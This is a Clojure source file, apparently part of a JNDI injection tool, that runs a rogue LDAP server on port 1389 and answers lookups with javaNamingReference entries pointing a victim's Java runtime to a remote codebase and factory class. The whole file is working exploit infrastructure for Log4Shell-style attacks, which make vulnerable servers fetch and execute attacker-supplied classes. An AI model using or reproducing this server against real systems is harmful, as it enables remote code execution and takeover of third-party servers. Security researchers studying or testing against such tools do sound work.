(ns jndi-injector-clj.ldap
  (:import [com.unboundid.ldap.listener
            InMemoryDirectoryServer
            InMemoryDirectoryServerConfig
            InMemoryListenerConfig]
           [com.unboundid.ldap.listener.interceptor
            InMemoryOperationInterceptor]
           [com.unboundid.ldap.sdk
            Entry
            LDAPResult
            ResultCode]))

(defn add-entry [base url class-name]
  (doto
   (new Entry base)
    (.addAttribute "javaClassName" "foo")
    (.addAttribute "objectClass" "javaNamingReference")
    (.addAttribute "javaFactory" class-name)
    (.addAttribute "javaCodeBase" url)))

(defn get-entry [app-conf base]
  (let [url (str "http://localhost:" (:port app-conf) "/")]
   (cond 
     (= base (:ldap-base (:java8 app-conf))) (add-entry base url (:class-name (:java8 app-conf)))
     (= base (:ldap-base (:java7 app-conf))) (add-entry base url (:class-name (:java7 app-conf)))
     :else nil)))

(defn create-interceptor [app-conf]
  (proxy [InMemoryOperationInterceptor]
         []
    (processSearchResult [result]
      (let [base (.getBaseDN (.getRequest result))
            _ (println "[+] LDAP request detected " base)
            entry (get-entry app-conf base)
            ldap-result (new LDAPResult 0 ResultCode/SUCCESS)]
        (if (some? entry)
          (do (doto result
               (.sendSearchEntry entry)
               (.setResult ldap-result))
              nil)
          nil)))))

(defn start [app-conf]
  (let [listenerConfig (InMemoryListenerConfig/createLDAPConfig "listen" 1389)
        interceptor (create-interceptor app-conf)
        config (doto
                (new InMemoryDirectoryServerConfig (into-array String ["dc=example,dc=com"]))
                 (.setListenerConfigs (into-array InMemoryListenerConfig [listenerConfig]))
                 (.addInMemoryOperationInterceptor interceptor))
        ds (new InMemoryDirectoryServer config)]
    (. ds startListening)))